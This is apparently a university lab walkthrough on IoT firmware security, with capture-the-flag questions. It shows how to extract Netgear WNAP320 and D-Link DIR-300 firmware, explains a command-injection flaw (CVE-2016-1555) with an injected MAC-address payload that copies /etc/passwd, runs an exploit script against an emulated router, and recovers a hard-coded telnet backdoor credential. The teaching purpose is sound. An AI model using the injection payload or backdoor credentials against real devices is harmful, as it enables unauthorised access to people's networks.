# Lab 9: IoT CI & CPS

Walkthrough video:

**IoT & CPS 9-1** [https://www.youtube.com/watch?v=nTjmkLGOJZ0](https://www.youtube.com/watch?v=nTjmkLGOJZ0)

## Intro to IoT CI & CPS

A challenge of dealing with IoT and Cyberphysical Systems in general is that the software runs on specific hardware rather than general purpose computers. Also, there are a number of different operating systems that these devices can use. IoT are different from normal computers in that they have less resources like memory to operate with and usually are diskless.

Having said that, a large number of consumer devices operate on a linux or linux-like system and so that makes analysis of these devices and even software emulation somewhat simpler.

IoT have a history of poor security. One of the principle areas of concern, and one we will look at in this lab has been the use of hard-coded passwords for remote access to the devices and leaving access to those services open by default.

## Examining firmware

In this exercise, we are going to be looking at the firmware from a Netgear Wireless Router the WNAP320 which was a consumer wireless router which went on sale in 2010 but was available for several years after that. Like all consumer router devices, it provides a web interface to administer the device. It also supports remote access using Telnet and SSH which are not enabled by default. The administration function is normally accessed by being on the local network or by using a direct cable to connect to the device. Some details of the device are provided here: [https://usermanual.wiki/Netgear/NetgearWnap320QuickReferenceGuide.33658341/html](https://usermanual.wiki/Netgear/NetgearWnap320QuickReferenceGuide.33658341/html)

The device ships with a default username of **admin** and a password of **password**. This is already a problem because a large number of users would leave the device configured with the defaults and never change them.

Let us start by using the docker container as follows

{% tabs %}
{% tab title="Windows/Apple Intel" %}
```bash
docker run -p 8000:8000 -it cybernemosyne/cits1003:iot 
```
{% endtab %}

{% tab title="Apple Silicon" %}
```
docker run -p 8000:8000 -it cybernemosyne/cits1003:iot-x 
```
{% endtab %}
{% endtabs %}

Change directory to /opt/samples/WNAP320

In that directory is a ZIP file which is the firmware for the WNAP320 router (alternatively, you can still download the firmware from Netgear http://www.downloads.netgear.com/files/GDC/WNAP320/WNAP320%20Firmware%20Version%202.0.3.zip)

Let us unzip the file and see what it contains

```bash
> unzip WNAP320\ Firmware\ Version\ 2.0.3.zip 
Archive:  WNAP320 Firmware Version 2.0.3.zip
  inflating: ReleaseNotes_WNAP320_fw_2.0.3.HTML  
  inflating: WNAP320_V2.0.3_firmware.tar  
```

The file WNAPP320V2.0.3\_firmware.tar file is another archive file (colloquially called a tarball). We can extract this using the tar utility:

```bash
> tar -xvf WNAP320_V2.0.3_firmware.tar 
vmlinux.gz.uImage
rootfs.squashfs
root_fs.md5
kernel.md5
```

The vmlinux.gz.uImage is the actual kernel of the operating system and contains all of the code that will run that when booted on a device. The rootfs.sqaushfs is the file system in squashfs format. The files with the md5 extension are the MD5 hashes of the image and squashfs files. To look at the contents of the squashfs file, we need to extract this file and we can use the **binwalk** tool to do this:

```bash
> binwalk -e rootfs.squashfs 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Squashfs filesystem, big endian, lzma signature, version 3.1, size: 4433988 bytes, 1247 inodes, blocksize: 65536 bytes, created: 2011-06-23 10:46:19

root@c3e1d7ac5055:/opt/samples/WNAP320# ls -al
total 15864
drwxr-xr-x 1 root root    4096 Jul  9 03:14  .
drwxr-xr-x 1 root root    4096 Jul  8 04:44  ..
-rw-r--r-- 1 root root    2667 Apr  3  2012  ReleaseNotes_WNAP320_fw_2.0.3.HTML
-rw-r--r-- 1 root root 5362552 Apr  4  2012 'WNAP320 Firmware Version 2.0.3.zip'
-rw-r--r-- 1 root root 5427200 Apr  3  2012  WNAP320_V2.0.3_firmware.tar
drwxr-xr-x 3 root root    4096 Jul  9 03:14  _rootfs.squashfs.extracted
-rw-r--r-- 1 root root      36 Jun 23  2011  kernel.md5
-rw-r--r-- 1 root root      36 Jun 23  2011  root_fs.md5
-rwx------ 1 root root 4435968 Jun 23  2011  rootfs.squashfs
-rw-r--r-- 1 root root  983104 Jun 23  2011  vmlinux.gz.uImage
```

This will now extract a directory \_rootfs.squashfs.extracted that contains squashfs-root which is the root of the filesystem for the firmware:

```bash
/squashfs-root# ls -al
total 52
drwxr-xr-x 13 root root 4096 Jun 23  2011 .
drwxr-xr-x  3 root root 4096 Jul  9 03:14 ..
drwxr-xr-x  2 root root 4096 Jun 23  2011 bin
drwxr-xr-x  3 root root 4096 Jun 23  2011 dev
drwxr-xr-x  6 root root 4096 Jun 23  2011 etc
drwxr-xr-x  4 root root 4096 Jun 23  2011 home
drwxr-xr-x  3 root root 4096 Jun 23  2011 lib
lrwxrwxrwx  1 root root   11 Jun 23  2011 linuxrc -> bin/busybox
drwxr-xr-x  2 root root 4096 Aug 22  2008 proc
drwxr-xr-x  2 root root 4096 Aug 22  2008 root
drwxr-xr-x  2 root root 4096 Jun 23  2011 sbin
drwxr-xr-x  2 root root 4096 Aug 22  2008 tmp
drwxr-xr-x  7 root root 4096 Jun 23  2011 usr
drwxr-xr-x  2 root root 4096 Nov 11  2008 var
```

This is the layout of a normal linux-based operating system.

When exploring the firmware, we would start by looking at where the source code for the management functionality is stored. In this software, that is in /home/www and if you look in that directory, you will find PHP files that represent the code that runs the administration website:

```bash
.../squashfs-root/home/www# ls
BackupConfig.php  boardDataWW.php  checkSession.php  data.php            header.php  index.php          login_header.php  packetCapture.php  saveTable.php   test.php        tmpl
UserGuide.html    body.php         clearLog.php      downloadFile.php    help        killall.php        logout.html       recreate.php       siteSurvey.php  thirdMenu.html
background.html   button.html      common.php        getBoardConfig.php  images      login.php          logout.php        redirect.html      support.link    thirdMenu.php
boardDataNA.php   checkConfig.php  config.php        getJsonData.php     include     login_button.html  monitorFile.cfg   redirect.php       templates       titleLogo.php
```

It turns out that there is a vulnerability in a number of these files that allows for remote command execution (RCE) that has the CVE CVE-2016-1555. The exploit code is listed on exploit-db here [https://www.exploit-db.com/exploits/45909](https://www.exploit-db.com/exploits/45909)

One of the affected files is boardDataWW.php and the specific code at fault is:

```php
		if (!empty($_REQUEST['macAddress']) && array_search($_REQUEST['reginfo'],Array('WW'=>'0','NA'=>'1'))!==false && ereg("[0-9a-fA-F]{12,12}",$_REQUEST['macAddress'],$regs)!==false) {
			//echo "test ".$_REQUEST['macAddress']." ".$_REQUEST['reginfo'];
			//exec("wr_mfg_data ".$_REQUEST['macAddress']." ".$_REQUEST['reginfo'],$dummy,$res);
			exec("wr_mfg_data -m ".$_REQUEST['macAddress']." -c ".$_REQUEST['reginfo'],$dummy,$res);
```

This code file is responsible for showing this page to capture a MAC address for the device:

![Screen handled by boardDataWW.php](../.gitbook/assets/screen-shot-2021-07-09-at-2.26.16-pm.png)

When the user enters a MAC address and clicks the submit button, the code above checks that it has been sent a valid MAC address (12 characters, alphanumeric) and a region code, and then it passes that to a command line utility called wr\_mfg\_data. If the MAC address was f8ffc201fae5 and region code was 1, the command that would be executed would be:

```bash
wr_mfg_data -m f8ffc201fae5 -c 1
```

You will notice that there is no validation of the input to this command by the code. It just checks that the first 12 characters of the MAC address are alphanumeric. This means we can add data to the end of a valid MAC address and it will accept it. So if we add a second command to the address, it will be executed as well. To do that, we use the command separator ; as follows:

```bash
wr_mfg_data -m f8ffc201fae5;cp /etc/passwd test.html; -c 1
```

To achieve this we would put "f8ffc201fae5;cp /etc/passwd test.html;" into the text box for the MAC address. The second command copies the password file to an HTML file test.html that we can then access from the website.

For this to work, we need to bypass a JavaScript validation check in the browser of the MAC address but that is trivial to do.

### Testing the Vulnerability

Short of going out and buying a wireless router to test this on, we can run the firmware in an emulator. There is an open source toolset that allows you to do that called Firmadyne. It is beyond the scope of this lab to set that up and get it running however, there is a version that I have set up on a Cloud VM that you can access with an exploit script. To run this, you can type:

```bash
root@c3e1d7ac5055:/opt/samples/WNAP320# ./exploit.py /etc/passwd
root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:100:sync:/bin:/bin/sync
mail:x:8:8:mail:/var/spool/mail:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
operator:x:37:37:Operator:/var:/bin/sh
haldaemon:x:68:68:hald:/:/bin/sh
dbus:x:81:81:dbus:/var/run/dbus:/bin/sh
nobody:x:99:99:nobody:/home:/bin/sh
sshd:x:103:99:Operator:/var:/bin/sh
admin:x:0:0:Default non-root user:/home/cli/menu:/usr/sbin/cli
```

If you are interested, you can look at the code in the Python script exploit.py. It takes one argument, the file on the router you want to look at. Of course, the script could be changed to insert a backdoor into the router and then gain access to the network that the router is connected to.

## Question 1. Exploit to find the flag

**Flag: Run exploit.py and pass the argument flag.txt**

## Searching for Hard Coded Credentials

In this example, we are looking at firmware for the DLINK 300 wireless access point. Change directory into **/opt/samples/DIR300**. Extract the firmware file with binwalk.

```bash
root@c3e1d7ac5055:/opt/samples/DIR300# binwalk -e DIR-300A1_FW105b09.bin 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
48            0x30            Unix path: /dev/mtdblock/2
96            0x60            LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 1626112 bytes
524384        0x80060         PackImg section delimiter tag, little endian size: 13638400 bytes; big endian size: 1822720 bytes
524416        0x80080         Squashfs filesystem, big endian, version 2.0, size: 1819244 bytes, 895 inodes, blocksize: 65536 bytes, created: 2010-11-26 07:22:55

root@c3e1d7ac5055:/opt/samples/DIR300# ls -al
total 2316
drwxr-xr-x 4 root root    4096 Jul 10 03:42 .
drwxr-xr-x 1 root root    4096 Jul 10 02:14 ..
-rw-r--r-- 1 root root 2347136 Feb 12  2016 DIR-300A1_FW105b09.bin
drwxr-xr-x 3 root root    4096 Jul 10 02:14 _DIR-300A1_FW105b09.bin.extracted
```

We can now cd into the directory \_DIR-300A1\_FW105b09.bin.extracted and then into the directory squashfs-root. Again we have a Linux filesystem

```bash
root@c3e1d7ac5055:/opt/samples/DIR300/_DIR-300A1_FW105b09.bin.extracted/squashfs-root# ls -al
total 56
drwxrwsr-x 14  528 1000 4096 Nov 26  2010 .
drwxr-xr-x  3 root root 4096 Jul 10 02:14 ..
drwxrwsr-x  2  528 1000 4096 Nov 26  2010 bin
drwxrwsr-x  2  528 1000 4096 Nov 26  2010 dev
drwxrwsr-x  9  528 1000 4096 Nov 26  2010 etc
drwxrwsr-x  2  528 1000 4096 Nov 26  2010 home
drwxrwsr-x  4  528 1000 4096 Nov 26  2010 htdocs
drwxrwsr-x  4  528 1000 4096 Nov 26  2010 lib
drwxrwsr-x  2  528 1000 4096 Nov 26  2010 mnt
drwxrwsr-x  2  528 1000 4096 Nov 26  2010 proc
drwxrwsr-x  2  528 1000 4096 Nov 26  2010 sbin
lrwxrwxrwx  1  528 1000    8 Jul 10 02:14 tmp -> /var/tmp
drwxrwsr-x  5  528 1000 4096 Nov 26  2010 usr
drwxrwsr-x  2  528 1000 4096 Nov 26  2010 var
drwxrwsr-x 11  528 1000 4096 Nov 26  2010 www
```

You can explore the file system a bit to see where things are but to shortcut, we are interested in the telnet service which allows remote access to the DLINK box. If we do a search for the word telnet in all of the files we get:

```bash
/squashfs-root# grep -ir telnet *
etc/scripts/misc/telnetd.sh:TELNETD=`rgdb -g /sys/telnetd`
etc/scripts/misc/telnetd.sh:if [ "$TELNETD" = "true" ]; then
etc/scripts/misc/telnetd.sh:	echo "Start telnetd ..." > /dev/console
etc/scripts/misc/telnetd.sh:		telnetd -l "/usr/sbin/login" -u Alphanetworks:$image_sign -i $lf &
etc/scripts/misc/telnetd.sh:		telnetd &
etc/scripts/system.sh:	# start telnet daemon
etc/scripts/system.sh:	/etc/scripts/misc/telnetd.sh	> /dev/console
etc/defnodes/S11setnodes.php:set("/sys/telnetd",			"true");
Binary file usr/lib/tc/q_netem.so matches
www/__adv_port.php:					<option value='Telnet'>Telnet</option>
```

The file that is interesting is the script telnetd.sh where there is a login command with a -u flag that passes in a username and password. If we open the script and look at it we notice that the variable $image\_sign gets set to the contents of a file:

```bash
#!/bin/sh
image_sign=`cat /etc/config/image_sign`
```

And if we look at the contents of that file we get:

```bash
/squashfs-root# cat ./etc/config/image_sign 
wrgg19_c_dlwbr_dir300
```

So the username and password for the device is

```bash
Alphanetworks:wrgg19_c_dlwbr_dir300
```

The dir300 is the model number and the other parts of the password don't change much between models. Others have compiled a list of possible passwords for DLINK routers ([https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/dlink\_telnet\_backdoor\_userpass.txt](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/dlink\_telnet\_backdoor\_userpass.txt)).

### **Question 2. Enter the password**

**Flag: Enter the password to claim the flag**

Clearly it is not a good thing that the password for the router is available on a remote connection protocol like Telnet that is enabled on this router by default. DLINK has tried to improve its security including encrypting the firmware. However, even here, the key has been reverse engineered and some of the encrypted firmware that DLINK provides can be unencrypted easily.
